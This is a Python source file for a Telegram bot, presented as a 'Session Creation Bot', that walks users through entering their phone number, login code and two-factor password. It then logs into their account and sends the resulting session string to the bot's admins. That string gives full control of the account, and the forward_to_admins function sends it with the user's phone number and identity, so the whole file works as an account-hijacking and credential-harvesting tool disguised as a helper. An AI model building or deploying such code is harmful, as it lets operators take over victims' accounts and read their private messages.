import os
import asyncio
import logging
from typing import Dict, Optional
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.types import User
import config

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class SessionBot:
    def __init__(self):
        self.bot = TelegramClient('session_bot', config.API_ID, config.API_HASH)
        self.user_sessions: Dict[int, Dict] = {}
        self.setup_handlers()
        
    def setup_handlers(self):
        """Setup bot command handlers"""
        
        @self.bot.on(events.NewMessage(pattern='/start'))
        async def start_handler(event):
            """Start command handler"""
            user_id = event.sender_id
            await event.reply(
                "🤖 **Session Creation Bot**\n\n"
                "I'll help you create a Telegram session file.\n\n"
                "**Available Commands:**\n"
                "/create_session - Start session creation\n"
                "/cancel - Cancel current operation\n\n"
                "⚠️ **Note:** Your session files will be securely stored and forwarded to admins."
            )
        
        @self.bot.on(events.NewMessage(pattern='/create_session'))
        async def create_session_handler(event):
            """Start session creation process"""
            user_id = event.sender_id
            
            if user_id in self.user_sessions:
                await event.reply("❌ You already have a session creation in progress!")
                return
            
            # Initialize user session data
            self.user_sessions[user_id] = {
                'step': 'phone',
                'client': None,
                'phone_code_hash': None
            }
            
            await event.reply(
                "📱 **Session Creation Started**\n\n"
                "Please send your phone number in international format:\n"
                "Example: `+1234567890`\n\n"
                "Use /cancel to stop the process."
            )
        
        @self.bot.on(events.NewMessage(pattern='/cancel'))
        async def cancel_handler(event):
            """Cancel current operation"""
            user_id = event.sender_id
            
            if user_id in self.user_sessions:
                session_data = self.user_sessions[user_id]
                if session_data['client']:
                    await session_data['client'].disconnect()
                del self.user_sessions[user_id]
                await event.reply("❌ Operation cancelled.")
            else:
                await event.reply("❌ No active operation to cancel.")
        
        @self.bot.on(events.NewMessage)
        async def message_handler(event):
            """Handle all messages for session creation"""
            user_id = event.sender_id
            message_text = event.message.text
            
            # Skip if not in session creation
            if user_id not in self.user_sessions:
                return
            
            session_data = self.user_sessions[user_id]
            
            try:
                if session_data['step'] == 'phone':
                    await self.handle_phone_number(event, session_data, message_text)
                
                elif session_data['step'] == 'code':
                    await self.handle_otp_code(event, session_data, message_text)
                
                elif session_data['step'] == 'password':
                    await self.handle_2fa(event, session_data, message_text)
                    
            except Exception as e:
                logger.error(f"Error in session creation for user {user_id}: {e}")
                await event.reply(f"❌ An error occurred: {str(e)}\n\nUse /create_session to try again.")
                await self.cleanup_user_session(user_id)
    
    async def handle_phone_number(self, event, session_data, phone_number: str):
        """Handle phone number input"""
        try:
            # Validate phone number format
            if not phone_number.startswith('+'):
                await event.reply("❌ Please use international format starting with '+'")
                return
            
            # Create Telegram client
            session = StringSession()
            client = TelegramClient(session, config.API_ID, config.API_HASH)
            session_data['client'] = client
            
            await client.connect()
            
            # Send code request
            sent_code = await client.send_code_request(phone_number)
            session_data['phone_code_hash'] = sent_code.phone_code_hash
            session_data['phone_number'] = phone_number
            session_data['step'] = 'code'
            
            await event.reply(
                "📨 **OTP Sent**\n\n"
                "I've sent a verification code to your phone.\n"
                "Please enter the code you received:\n\n"
                "Format: `12345`"
            )
            
        except Exception as e:
            await event.reply(f"❌ Error sending code: {str(e)}\n\nUse /create_session to try again.")
            await self.cleanup_user_session(event.sender_id)
    
    async def handle_otp_code(self, event, session_data, code: str):
        """Handle OTP code input"""
        try:
            # Validate code format
            if not code.isdigit():
                await event.reply("❌ Please enter only numbers")
                return
            
            client = session_data['client']
            
            # Sign in with code
            try:
                await client.sign_in(
                    phone_number=session_data['phone_number'],
                    code=code,
                    phone_code_hash=session_data['phone_code_hash']
                )
                
            except Exception as e:
                # Check if 2FA is required
                if "two-steps" in str(e).lower():
                    session_data['step'] = 'password'
                    await event.reply(
                        "🔐 **Two-Factor Authentication**\n\n"
                        "Your account has 2FA enabled.\n"
                        "Please enter your 2FA password:"
                    )
                    return
                else:
                    raise e
            
            # If no 2FA required, complete login
            await self.complete_session_creation(event, session_data)
            
        except Exception as e:
            await event.reply(f"❌ Error verifying code: {str(e)}\n\nUse /create_session to try again.")
            await self.cleanup_user_session(event.sender_id)
    
    async def handle_2fa(self, event, session_data, password: str):
        """Handle 2FA password input"""
        try:
            client = session_data['client']
            
            # Complete sign in with 2FA
            await client.sign_in(password=password)
            
            # Complete session creation
            await self.complete_session_creation(event, session_data)
            
        except Exception as e:
            await event.reply(f"❌ Error with 2FA: {str(e)}\n\nUse /create_session to try again.")
            await self.cleanup_user_session(event.sender_id)
    
    async def complete_session_creation(self, event, session_data):
        """Complete session creation and save file"""
        user_id = event.sender_id
        client = session_data['client']
        
        try:
            # Get user information
            me = await client.get_me()
            session_string = client.session.save()
            
            # Create session file
            filename = f"session_{user_id}_{me.id}.session"
            filepath = os.path.join(config.SESSION_FOLDER, filename)
            
            # Ensure sessions directory exists
            os.makedirs(config.SESSION_FOLDER, exist_ok=True)
            
            # Save session file
            with open(filepath, 'w') as f:
                f.write(session_string)
            
            # Create session info
            session_info = (
                f"✅ **Session Created Successfully!**\n\n"
                f"👤 **User:** {me.first_name} {me.last_name or ''}\n"
                f"📱 **Phone:** {session_data['phone_number']}\n"
                f"🆔 **User ID:** {me.id}\n"
                f"📁 **Session File:** `{filename}`\n\n"
                f"⚠️ **Keep your session file secure!**"
            )
            
            await event.reply(session_info)
            
            # Forward session to admins
            await self.forward_to_admins(user_id, me, session_data['phone_number'], session_string, filename)
            
        except Exception as e:
            logger.error(f"Error completing session creation: {e}")
            await event.reply("❌ Error saving session. Please try again.")
        finally:
            await self.cleanup_user_session(user_id)
    
    async def forward_to_admins(self, bot_user_id: int, telegram_user: User, phone: str, session_string: str, filename: str):
        """Forward session information to admins"""
        try:
            session_info = (
                f"📋 **New Session Created**\n\n"
                f"🤖 **Bot User ID:** {bot_user_id}\n"
                f"👤 **Telegram User:** {telegram_user.first_name} {telegram_user.last_name or ''}\n"
                f"📱 **Phone:** {phone}\n"
                f"🆔 **Telegram ID:** {telegram_user.id}\n"
                f"📁 **Filename:** {filename}\n"
                f"🔐 **Session String:**\n`{session_string}`"
            )
            
            for admin_id in config.ADMIN_IDS:
                try:
                    # Send session info
                    await self.bot.send_message(admin_id, session_info)
                    
                    # Save session file and send as document
                    temp_file = f"temp_{filename}"
                    with open(temp_file, 'w') as f:
                        f.write(session_string)
                    
                    await self.bot.send_file(
                        admin_id,
                        temp_file,
                        caption=f"Session file: {filename}"
                    )
                    
                    # Clean up temp file
                    os.remove(temp_file)
                    
                except Exception as e:
                    logger.error(f"Error sending to admin {admin_id}: {e}")
                    
        except Exception as e:
            logger.error(f"Error forwarding to admins: {e}")
    
    async def cleanup_user_session(self, user_id: int):
        """Clean up user session data"""
        if user_id in self.user_sessions:
            session_data = self.user_sessions[user_id]
            if session_data['client']:
                try:
                    await session_data['client'].disconnect()
                except:
                    pass
            del self.user_sessions[user_id]
    
    async def run(self):
        """Start the bot"""
        # Ensure sessions directory exists
        os.makedirs(config.SESSION_FOLDER, exist_ok=True)
        
        logger.info("Starting Session Bot...")
        await self.bot.start(bot_token=config.BOT_TOKEN)
        
        me = await self.bot.get_me()
        logger.info(f"Bot started as @{me.username}")
        
        # Notify admins
        for admin_id in config.ADMIN_IDS:
            try:
                await self.bot.send_message(admin_id, "🤖 Session Bot Started!")
            except Exception as e:
                logger.error(f"Could not notify admin {admin_id}: {e}")
        
        await self.bot.run_until_disconnected()

async def main():
    bot = SessionBot()
    await bot.run()

if __name__ == "__main__":
    asyncio.run(main())
